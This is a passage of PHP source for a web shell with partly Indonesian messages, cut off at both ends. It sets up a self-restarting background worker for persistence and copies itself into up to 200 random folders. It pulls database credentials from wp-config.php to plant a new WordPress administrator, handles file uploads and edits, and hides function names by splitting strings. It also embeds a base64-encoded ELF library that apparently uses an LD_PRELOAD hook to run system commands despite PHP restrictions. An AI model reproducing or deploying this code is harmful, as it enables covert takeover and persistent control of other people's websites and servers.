                @exec('nohup ' . escapeshellarg($phpBin) . ' ' . escapeshellarg($jantungPath) . ' > /dev/null 2>&1 &');
                $res = "SETUP OK\n";
                $res .= "Worker : " . $jantungPath . "\n";
                $res .= "Config  : .autoloop.conf\n";
                $res .= "Method  : " . strtoupper($method) . "\n";
                $res .= "Interval: 60s\n";
                $res .= "Monitor : " . $targetName . "\n";
                $res .= "Worker running in background.";
            }
        } elseif ($al === 'stop') {
            $cfg = autoloop_config();
            if ($cfg === null) {
                $res = "No config found — nothing to stop";
            } else {
                autoloop_kill($cfg);
                $jp = rtrim($cfg['path'], '/') . '/aloop_' . $cfg['marker'] . '.php';
                @unlink($jp);
                @unlink(AUTOLOOP_CONFIG);
                @unlink(AUTOLOOP_HB);
                $res = "Auto looping stopped\nWorker removed: " . $jp . "\nConfig .autoloop.conf removed";
            }
        } elseif ($al === 'delete') {
            $cfg = autoloop_config();
            if ($cfg !== null) {
                autoloop_kill($cfg);
                $jp = rtrim($cfg['path'], '/') . '/aloop_' . $cfg['marker'] . '.php';
                @unlink($jp);
            }
            @unlink(AUTOLOOP_CONFIG);
            @unlink(AUTOLOOP_HB);
            $res = "Config .autoloop.conf removed";
        }
        if ($inline) {
            while (ob_get_level() > 0) { ob_end_clean(); }
            header('Content-Type: text/plain; charset=utf-8');
            echo $res;
            exit;
        }
        $viewC0MM4NDResult = '<hr><p>Auto Looping:</p><textarea class="result-box">' . $htm($res) . '</textarea>';
    }

    if (isset($_POST['clone_action']) && $_POST['clone_action'] === 'run') {
        $out = [];
        $basePath = isset($_POST['clone_path']) ? trim($_POST['clone_path']) : '';
        $count = isset($_POST['clone_count']) ? intval($_POST['clone_count']) : 1;
        if ($count < 1) $count = 1;
        if ($count > 200) $count = 200;

        if ($basePath === '' || !is_dir($basePath)) {
            $out[] = 'Error: Path not found: ' . $basePath;
        } else {
            $self = __FILE__;
            $srcName = basename($self);
            $content = @file_get_contents($self);
            if ($content === false || strlen($content) === 0) {
                $out[] = 'Error: Failed to read source file!';
            } else {
                $ok = 0;
                for ($i = 0; $i < $count; $i++) {
                    $dirName = $srcName . '_' . substr(md5(uniqid(mt_rand(), true)), 0, 10);
                    $dir = rtrim($basePath, '/') . '/' . $dirName;
                    if (!@mkdir($dir, 0755, true)) {
                        $out[] = 'Error: Failed to create folder: ' . $dir;
                        continue;
                    }
                    $dest = $dir . '/' . $srcName;
                    if (@file_put_contents($dest, $content) !== false) {
                        @chmod($dest, 0755);
                        $out[] = 'Clone result: ' . $dest;
                        $ok++;
                        watchdog_log('BACKUP', ['File: <code>' . $dest . '</code>', 'Ukuran: <b>' . round(strlen($content)/1024, 2) . ' KB</b>'], 'Massive cloning');
                    } else {
                        $out[] = 'Error: Failed to write file to ' . $dest;
                    }
                }
                $out[] = '';
                $out[] = 'Total cloned: ' . $ok . ' / ' . $count . ' successful';
            }
        }
        $viewC0MM4NDResult = '<hr><p>Clone Result:</p><textarea class="result-box">' . $htm(implode("\n", $out)) . '</textarea>';
    }

    if (isset($_POST['wpadmin_action']) && $_POST['wpadmin_action'] === 'create') {
        $out = [];
        $basePath = isset($_POST['wp_path']) ? trim($_POST['wp_path']) : '';
        $username = isset($_POST['wp_user']) ? trim($_POST['wp_user']) : '';
        $password = isset($_POST['wp_pass']) ? trim($_POST['wp_pass']) : '';
        $email = isset($_POST['wp_email']) ? trim($_POST['wp_email']) : '';
        if ($username === '' || $password === '') {
            $out[] = 'Error: Username & password are required!';
        } else {
            if ($basePath === '') $basePath = __DIR__;
            if (!is_dir($basePath)) { $out[] = 'Error: Path not found: ' . $basePath; }
            else {
                if ($email === '') $email = $username . '@admin.local';
                $configPath = '';
                for ($i = 0; $i <= 5; $i++) {
                    $try = $basePath . str_repeat('/..', $i) . '/wp-config.php';
                    if (file_exists($try)) { $configPath = $try; break; }
                }
                if ($configPath === '') {
                    try {
                        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($basePath, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST, RecursiveIteratorIterator::CATCH_GET_CHILD);
                        foreach ($it as $f) {
                            if ($f->isFile() && $f->getFilename() === 'wp-config.php') { $configPath = $f->getPathname(); break; }
                        }
                    } catch (Exception $e) {}
                }
                if ($configPath === '') {
                    $out[] = 'Error: wp-config.php not found in ' . $basePath;
                } else {
                    $out[] = 'Config: ' . $configPath;
                    $content = @file_get_contents($configPath);
                    $db_name = ''; $db_user = ''; $db_pass = ''; $db_host = 'localhost'; $prefix = 'wp_';
                    if (preg_match("/define\s*\(\s*'DB_NAME'\s*,\s*'([^']+)'/", $content, $m)) $db_name = $m[1];
                    if (preg_match("/define\s*\(\s*'DB_USER'\s*,\s*'([^']+)'/", $content, $m)) $db_user = $m[1];
                    if (preg_match("/define\s*\(\s*'DB_PASSWORD'\s*,\s*'([^']+)'/", $content, $m)) $db_pass = $m[1];
                    if (preg_match("/define\s*\(\s*'DB_HOST'\s*,\s*'([^']+)'/", $content, $m)) $db_host = $m[1];
                    if (preg_match("/\$table_prefix\s*=\s*'([^']+)'/", $content, $m)) $prefix = $m[1];
                    $out[] = 'DB: ' . $db_name . ' | USER: ' . $db_user . ' | HOST: ' . $db_host . ' | PREFIX: ' . $prefix;
                    $conn = @new mysqli($db_host, $db_user, $db_pass, $db_name);
                    if ($conn->connect_error) { $conn = @new mysqli('localhost', $db_user, $db_pass, $db_name); }
                    if ($conn->connect_error) {
                        $out[] = 'DB error: ' . $conn->connect_error;
                    } else {
                        $out[] = 'DB connected';
                        $hashed = password_hash($password, PASSWORD_DEFAULT);
                        $u = $conn->real_escape_string($username);
                        $e = $conn->real_escape_string($email);
                        $chk = $conn->query("SELECT ID FROM {$prefix}users WHERE user_login = '$u'");
                        $finalUser = $username;
                        if ($chk && $chk->num_rows > 0) { $finalUser = $username . '_' . rand(1000, 9999); $out[] = 'User exists, using: ' . $finalUser; }
                        $fu = $conn->real_escape_string($finalUser);
                        $hp = $conn->real_escape_string($hashed);
                        $sql = "INSERT INTO {$prefix}users (user_login, user_pass, user_nicename, user_email, user_registered, display_name, user_status) VALUES ('$fu', '$hp', '$fu', '$e', NOW(), 'Admin', 0)";
                        if ($conn->query($sql)) {
                            $uid2 = $conn->insert_id;
                            $conn->query("INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) VALUES ($uid2, '{$prefix}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')");
                            $conn->query("INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) VALUES ($uid2, '{$prefix}user_level', '10')");
                            $out[] = '';
                            $out[] = '=== Success ===';
                            $out[] = 'Username : ' . $finalUser;
                            $out[] = 'Password : ' . $password;
                            $out[] = 'Email    : ' . $email;
                            $out[] = 'User ID  : ' . $uid2;
                            watchdog_log('CREATE', ['Admin WP baru dibuat', 'Username: <b>' . $finalUser . '</b>', 'DB: <code>' . $db_name . '</code>', 'Config: <code>' . $configPath . '</code>'], 'WordPress admin dibuat');
                        } else {
                            $out[] = 'Insert error: ' . $conn->error;
                        }
                        $conn->close();
                    }
                }
            }
        }
        $viewC0MM4NDResult = '<hr><p>Create WP Admin Result:</p><textarea class="result-box">' . $htm(implode("\n", $out)) . '</textarea>';
    }

    if (isset($_FILES['filetos'])) {
        $target_file = $currentDirectory . '/' . $bs($_FILES["filetos"]["name"]);
        if ($mup($_FILES["filetos"]["tmp_name"], $target_file)) {
            watchdog_log('UPLOAD', ['Halo! Ada yang upload file nih, abaikan jika itu kamu.', 'File: <code>' . $target_file . '</code>', 'Ukuran: <b>' . round($_FILES["filetos"]["size"]/1024, 2) . ' KB</b>'], 'File baru diupload');
            echo "<hr>File <i style=color:red;>" . $htm($bs($_FILES["filetos"]["name"])) . "</i> uploaded successfully<hr>";
        } else {
            echo "<hr>Sorry, there was an error uploading your file.<hr>";
        }
    } elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
        $ff = $_POST['folder_name'];
        $newF0LD3R = $currentDirectory . '/' . $ff;
        if (!file_exists($newfolder)) {
            if ($mek($newF0LD3R) !== false) {
                watchdog_log('CREATE', ['Folder: <code>' . $newF0LD3R . '</code>'], 'Folder baru dibuat');
                echo '<hr>Folder created successfully!';
            }else{
                echo '<hr>Error: Failed to create folder!';
            }
        }

    } elseif (isset($_POST['file_name'])) {
        $fileN4M3 = $_POST['file_name'];
        $newF1L3 = $currentDirectory . '/' . $fileN4M3;
        if (!file_exists($newF1L3)) {
            if ($fpc($newF1L3, '') !== false) {
                watchdog_log('CREATE', ['File: <code>' . $newF1L3 . '</code>'], 'File baru dibuat');
                echo '<hr>File <i style=color:red;>' . $fileN4M3 .'</i> created successfully!';
                $fileToV13W = $newF1L3;
                if (file_exists($fileToV13W)) {
                    $fileContent = $fgc($fileToV13W);
                    $viewC0MM4NDResult = '<hr><p>Result: ' . $fileN4M3 . '</p>
                    <form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
                    <textarea name="content" class="result-box">' . $htm($fileContent) . '</textarea><td>
                    <input type="hidden" name="edit_file" value="' . $fileN4M3 . '">
                    <input type="submit" value=" Save "></form></td>';
                } else {
                    $viewC0MM4NDResult = '<hr><p>Error: File not found!</p>';
                }
            } else {
                echo '<hr>Error: Failed to create file!';
            }
        }else{
            echo '<hr>Error: File already exists!';
        }
    } elseif (isset($_POST['cmd_input'])){
        $p = "p"."u"."t"."e"."n"."v";
        $a = "fi"."le_p"."ut_c"."ont"."e"."nt"."s";
        $m = "m"."a"."i"."l";
        $base = "ba"."se"."64"."_"."de"."co"."de";
        $en = "ba"."se"."64"."_"."en"."co"."de";
        $mb = "m"."b"."_"."s"."e"."n"."d"."_"."m"."a"."i"."l";
        $err = "e"."r"."r"."o"."r"."_"."l"."o"."g";
        $drnm = "d"."i"."r"."n"."a"."m"."e";
        $imp = "i"."m"."a"."p"."_"."m"."a"."i"."l";
        $currentF1L3Path = $_SERVER['PHP_SELF'];
        $doc = $_SERVER['DOCUMENT_ROOT'];
        $directoryPath = $drnm($currentF1L3Path);
        $full = $doc . $directoryPath;
        $hook = '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BwAAAAwAAAAAAAAAAAAAAEiD7AhIiwW9CCAASIXAdAL/0EiDxAjDAP810gggAP8l1AggAA8fQAD/JdIIIABoAAAAAOng/////yXKCCAAaAEAAADp0P////8lwgggAGgCAAAA6cD/////JboIIABoAwAAAOmw/////yWyCCAAaAQAAADpoP////8lqgggAGgFAAAA6ZD/////JaIIIABoBgAAAOmA/////yWaCCAAaAcAAADpcP////8lkgggAGgIAAAA6WD/////JSIIIABmkAAAAAAAAAAASI09gQggAEiNBYEIIABVSCn4SInlSIP4DnYVSIsF1gcgAEiFwHQJXf/gZg8fRAAAXcMPH0AAZi4PH4QAAAAAAEiNPUEIIABIjTU6CCAAVUgp/kiJ5UjB/gNIifBIweg/SAHGSNH+dBhIiwWhByAASIXAdAxd/+BmDx+EAAAAAABdww8fQABmLg8fhAAAAAAAgD3xByAAAHUnSIM9dwcgAABVSInldAxIiz3SByAA6D3////oSP///13GBcgHIAAB88MPH0AAZi4PH4QAAAAAAEiNPVkFIABIgz8AdQvpXv///2YPH0QAAEiLBRkHIABIhcB06VVIieX/0F3pQP///1VIieVIjT16AAAA6FD+//++/wEAAEiJx+iT/v//SI09YQAAAOg3/v//SInH6E/+//+QXcNVSInlvgEAAAC/AQAAAOhZ/v//6JT+//+FwHQKvwAAAADodv7//5Bdw1VIieVIjT0lAAAA6FP+///o/v3//+gZ/v//kF3DAABIg+wISIPECMNDSEFOS1JPAExEX1BSRUxPQUQAARsDOzQAAAAFAAAAuP3//1AAAABY/v//eAAAAGj///+QAAAAnP///7AAAADF////0AAAAAAAAAAUAAAAAAAAAAF6UgABeBABGwwHCJABAAAkAAAAHAAAAGD9//+gAAAAAA4QRg4YSg8LdwiAAD8aOyozJCIAAAAAFAAAAEQAAADY/f//CAAAAAAAAAAAAAAAHAAAAFwAAADQ/v//NAAAAABBDhCGAkMNBm8MBwgAAAAcAAAAfAAAAOT+//8pAAAAAEEOEIYCQw0GZAwHCAAAABwAAACcAAAA7f7//x0AAAAAQQ4QhgJDDQZYDAcIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsAgAAAAAAAAAAAAAAAAAAHAIAAAAAAAAAAAAAAAAAAABAAAAAAAAALsAAAAAAAAADAAAAAAAAAAYBwAAAAAAAA0AAAAAAAAAXAkAAAAAAAAZAAAAAAAAAPgNIAAAAAAAGwAAAAAAAAAQAAAAAAAAABoAAAAAAAAACA4gAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAADwAQAAAAAAAAUAAAAAAAAAMAQAAAAAAAAGAAAAAAAAADgCAAAAAAAACgAAAAAAAADpAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAADAAAAAAAAAAAQIAAAAAAAAgAAAAAAAADYAAAAAAAAABQAAAAAAAAABwAAAAAAAAAXAAAAAAAAAEAGAAAAAAAABwAAAAAAAABoBQAAAAAAAAgAAAAAAAAA2AAAAAAAAAAJAAAAAAAAABgAAAAAAAAA/v//bwAAAABIBQAAAAAAAP///28AAAAAAQAAAAAAAADw//9vAAAAABoFAAAAAAAA+f//bwAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgOIAAAAAAAAAAAAAAAAAAAAAAAAAAAAEYHAAAAAAAAVgcAAAAAAABmBwAAAAAAAHYHAAAAAAAAhgcAAAAAAACWBwAAAAAAAKYHAAAAAAAAtgcAAAAAAADGBwAAAAAAAGAQIAAAAAAAR0NDOiAoRGViaWFuIDYuMy4wLTE4K2RlYjl1MSkgNi4zLjAgMjAxNzA1MTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAQDIAQAAAAAAAAAAAAAAAAAAAAAAAAMAAgDwAQAAAAAAAAAAAAAAAAAAAAAAAAMAAwA4AgAAAAAAAAAAAAAAAAAAAAAAAAMABAAwBAAAAAAAAAAAAAAAAAAAAAAAAAMABQAaBQAAAAAAAAAAAAAAAAAAAAAAAAMABgBIBQAAAAAAAAAAAAAAAAAAAAAAAAMABwBoBQAAAAAAAAAAAAAAAAAAAAAAAAMACABABgAAAAAAAAAAAAAAAAAAAAAAAAMACQAYBwAAAAAAAAAAAAAAAAAAAAAAAAMACgAwBwAAAAAAAAAAAAAAAAAAAAAAAAMACwDQBwAAAAAAAAAAAAAAAAAAAAAAAAMADADgBwAAAAAAAAAAAAAAAAAAAAAAAAMADQBcCQAAAAAAAAAAAAAAAAAAAAAAAAMADgBlCQAAAAAAAAAAAAAAAAAAAAAAAAMADwB4CQAAAAAAAAAAAAAAAAAAAAAAAAMAEACwCQAAAAAAAAAAAAAAAAAAAAAAAAMAEQD4DSAAAAAAAAAAAAAAAAAAAAAAAAMAEgAIDiAAAAAAAAAAAAAAAAAAAAAAAAMAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAMAFAAYDiAAAAAAAAAAAAAAAAAAAAAAAAMAFQDYDyAAAAAAAAAAAAAAAAAAAAAAAAMAFgAAECAAAAAAAAAAAAAAAAAAAAAAAAMAFwBgECAAAAAAAAAAAAAAAAAAAAAAAAMAGABoECAAAAAAAAAAAAAAAAAAAAAAAAMAGQAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAGQAAAAIADADgBwAAAAAAAAAAAAAAAAAAGwAAAAIADAAgCAAAAAAAAAAAAAAAAAAALgAAAAIADABwCAAAAAAAAAAAAAAAAAAARAAAAAEAGABoECAAAAAAAAEAAAAAAAAAUwAAAAEAEgAIDiAAAAAAAAAAAAAAAAAAegAAAAIADACwCAAAAAAAAAAAAAAAAAAAhgAAAAEAEQD4DSAAAAAAAAAAAAAAAAAApQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAArAAAAAEAEABoCgAAAAAAAAAAAAAAAAAAugAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAxgAAAAEAFwBgECAAAAAAAAAAAAAAAAAA0wAAAAEAFAAYDiAAAAAAAAAAAAAAAAAA3AAAAAAADwB4CQAAAAAAAAAAAAAAAAAA7wAAAAEAFwBoECAAAAAAAAAAAAAAAAAA+wAAAAEAFgAAECAAAAAAAAAAAAAAAAAAEQEAABIAAAAAAAAAAAAAAAAAAAAAAAAAJQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAQQEAABAAFwBoECAAAAAAAAAAAAAAAAAA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AwAAABYAAAAIAAAAAAAAABgAAAAAAAAAeAAAAAEAAAAGAAAAAAAAABgHAAAAAAAAGAcAAAAAAAAXAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAHMAAAABAAAABgAAAAAAAAAwBwAAAAAAADAHAAAAAAAAoAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAB+AAAAAQAAAAYAAAAAAAAA0AcAAAAAAADQBwAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAhwAAAAEAAAAGAAAAAAAAAOAHAAAAAAAA4AcAAAAAAAB6AQAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAI0AAAABAAAABgAAAAAAAABcCQAAAAAAAFwJAAAAAAAACQAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACTAAAAAQAAAAIAAAAAAAAAZQkAAAAAAABlCQAAAAAAABMAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAmwAAAAEAAAACAAAAAAAAAHgJAAAAAAAAeAkAAAAAAAA0AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAKkAAAABAAAAAgAAAAAAAACwCQAAAAAAALAJAAAAAAAAvAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAACzAAAADg